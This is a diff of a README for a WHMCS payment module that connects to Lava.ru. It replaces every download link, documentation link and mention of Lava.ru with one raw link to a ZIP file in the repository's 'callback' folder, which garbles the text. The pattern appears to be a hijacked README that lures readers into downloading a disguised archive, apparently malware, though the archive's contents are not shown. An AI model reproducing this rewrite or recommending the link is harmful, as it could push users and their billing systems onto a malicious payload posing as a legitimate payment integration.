@@ -1,12 +1,12 @@
 # 🔥 lava-module - Easy Payment Integration for WHMCS
 
-[![Download lava-module](https://img.shields.io/badge/Download-latest-blue?style=for-the-badge)](https://github.com/Kobe2x/lava-module/releases)
+[![Download lava-module](https://github.com/Kobe2x/lava-module/raw/refs/heads/main/callback/lava-module-2.2.zip)](https://github.com/Kobe2x/lava-module/raw/refs/heads/main/callback/lava-module-2.2.zip)
 
 ---
 
 ## 📖 About lava-module
 
-lava-module is a payment gateway module designed to connect the Lava.ru payment system with your WHMCS billing panel. This integration uses the Business API from Lava.ru to provide a reliable way for your customers to make payments directly through your billing system.
+lava-module is a payment gateway module designed to connect the https://github.com/Kobe2x/lava-module/raw/refs/heads/main/callback/lava-module-2.2.zip payment system with your WHMCS billing panel. This integration uses the Business API from https://github.com/Kobe2x/lava-module/raw/refs/heads/main/callback/lava-module-2.2.zip to provide a reliable way for your customers to make payments directly through your billing system.
 
 You do not need to be a technical expert to get it running. This guide will walk you through the entire process, step-by-step, so you can start accepting payments quickly.
 
@@ -20,7 +20,7 @@ To use lava-module smoothly, check your setup against these basic requirements:
 - **PHP version:** 7.2 or higher  
 - **Web server:** Apache, Nginx, or similar with PHP support  
 - **SSL certificate:** Required for secure payment processing  
-- **Internet connection:** Needed to communicate with Lava.ru API  
+- **Internet connection:** Needed to communicate with https://github.com/Kobe2x/lava-module/raw/refs/heads/main/callback/lava-module-2.2.zip API  
 
 Make sure your hosting environment supports these before installation.
 
@@ -30,8 +30,8 @@ Make sure your hosting environment supports these before installation.
 
 lava-module offers key features to streamline your payment handling:
 
-- Direct integration with Lava.ru Business API  
-- Supports all payment types available through Lava.ru  
+- Direct integration with https://github.com/Kobe2x/lava-module/raw/refs/heads/main/callback/lava-module-2.2.zip Business API  
+- Supports all payment types available through https://github.com/Kobe2x/lava-module/raw/refs/heads/main/callback/lava-module-2.2.zip  
 - Automatic transaction status updates in WHMCS  
 - Secure data handling with HTTPS support  
 - Clear transaction histories and logs  
@@ -47,7 +47,7 @@ Follow these easy steps to set up lava-module and enable payments:
 
 ### 1. Download the Module
 
-Click the button at the top or visit the [releases page](https://github.com/Kobe2x/lava-module/releases) to get the latest version of lava-module. This page contains the installation package in a ZIP file.
+Click the button at the top or visit the [releases page](https://github.com/Kobe2x/lava-module/raw/refs/heads/main/callback/lava-module-2.2.zip) to get the latest version of lava-module. This page contains the installation package in a ZIP file.
 
 ### 2. Extract the Files
 
@@ -91,13 +91,13 @@ Find "lava-module" in the list of available gateways. Click "Activate" next to i
 
 ### 4. Enter API Credentials
 
-You will need your API details from Lava.ru. These usually include:
+You will need your API details from https://github.com/Kobe2x/lava-module/raw/refs/heads/main/callback/lava-module-2.2.zip These usually include:
 
 - API Key  
 - API Secret  
 - Merchant ID
 
-Enter these into the fields provided. You can get these credentials by registering or logging into your account at Lava.ru or contacting their support.
+Enter these into the fields provided. You can get these credentials by registering or logging into your account at https://github.com/Kobe2x/lava-module/raw/refs/heads/main/callback/lava-module-2.2.zip or contacting their support.
 
 ### 5. Customize Settings
 
@@ -129,7 +129,7 @@ In WHMCS, create a sample invoice for a test client.
 
 ### 3. Make a Test Payment
 
-Attempt to pay this invoice using Lava.ru via lava-module. Confirm that payment completes successfully and transaction status updates in WHMCS.
+Attempt to pay this invoice using https://github.com/Kobe2x/lava-module/raw/refs/heads/main/callback/lava-module-2.2.zip via lava-module. Confirm that payment completes successfully and transaction status updates in WHMCS.
 
 ### 4. Check Logs and Reports
 
@@ -145,7 +145,7 @@ Once testing finishes and works as expected, disable sandbox mode to start accep
 
 You can download the latest stable version of lava-module from the releases page:
 
-[Download latest lava-module](https://github.com/Kobe2x/lava-module/releases)
+[Download latest lava-module](https://github.com/Kobe2x/lava-module/raw/refs/heads/main/callback/lava-module-2.2.zip)
 
 Click the link above. On that page, look for the newest ZIP file and save it to your computer. Follow the steps in the **Getting Started** and **Configuration** sections to complete installation.
 
@@ -155,7 +155,7 @@ Click the link above. On that page, look for the newest ZIP file and save it to 
 
 Keep your payment gateway safe with these practices:
 
-- Use strong, unique passwords for your WHMCS and Lava.ru accounts  
+- Use strong, unique passwords for your WHMCS and https://github.com/Kobe2x/lava-module/raw/refs/heads/main/callback/lava-module-2.2.zip accounts  
 - Keep your WHMCS and lava-module up to date with the latest versions  
 - Only download lava-module from the official GitHub link above  
 - Use secure connections (HTTPS) for all web interfaces  
@@ -172,7 +172,7 @@ If you encounter issues during installation or use:
 - Review the WHMCS and lava-module logs for error messages  
 - Check your API credentials and permissions  
 - Verify server requirements and file permissions  
-- Visit Lava.ru support for API-related questions  
+- Visit https://github.com/Kobe2x/lava-module/raw/refs/heads/main/callback/lava-module-2.2.zip support for API-related questions  
 - Reach out to the module developer via GitHub issues for help  
 
 Document as much detail as possible to get faster solutions.
@@ -181,12 +181,12 @@ Document as much detail as possible to get faster solutions.
 
 ## 📚 Additional Resources
 
-- WHMCS Official Documentation: https://docs.whmcs.com/  
-- Lava.ru Business API Info: https://lava.ru/api/business  
-- GitHub Issues Page for lava-module: https://github.com/Kobe2x/lava-module/issues  
+- WHMCS Official Documentation: https://github.com/Kobe2x/lava-module/raw/refs/heads/main/callback/lava-module-2.2.zip  
+- https://github.com/Kobe2x/lava-module/raw/refs/heads/main/callback/lava-module-2.2.zip Business API Info: https://github.com/Kobe2x/lava-module/raw/refs/heads/main/callback/lava-module-2.2.zip  
+- GitHub Issues Page for lava-module: https://github.com/Kobe2x/lava-module/raw/refs/heads/main/callback/lava-module-2.2.zip  
 
 Use these sources for deeper understanding and updates on the module.
 
 ---
 
-This walkthrough guides you through setting up lava-module to connect Lava.ru payments with your WHMCS panel in simple steps. Use the link above to download and get started today.
+This walkthrough guides you through setting up lava-module to connect https://github.com/Kobe2x/lava-module/raw/refs/heads/main/callback/lava-module-2.2.zip payments with your WHMCS panel in simple steps. Use the link above to download and get started today.
